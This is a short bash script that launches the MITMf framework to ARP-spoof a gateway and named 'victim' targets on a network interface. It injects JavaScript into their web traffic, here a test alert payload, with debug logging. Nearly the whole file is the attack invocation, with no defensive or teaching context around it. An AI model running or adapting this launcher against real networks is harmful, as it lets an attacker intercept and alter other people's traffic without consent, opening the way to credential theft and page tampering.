#!/bin/bash

: ${gateway?"Need to set gateway"}
: ${targets?"Need to set targets (victim)"}
: ${interface?"Need to set interface"}

source 00.sh

notify "m1tmf 5t4rt1ng ..."

status "gateway=$gateway"
status "targets=$targets"
status "interface=$interface"

export MITMF_FRAMEWORK="$HOME/isidis/MITMf"

if [ -d "$MITMF_FRAMEWORK" ]; then
  cd "$MITMF_FRAMEWORK"
else
  error "M1TMF framework not found ($MITMF_FRAMEWORK)"
fi

./mitmf.py --arp --spoof --gateway $gateway --targets $targets -i $interface --inject --js-payload "alert('test');" --log-level debug --arpmode rep
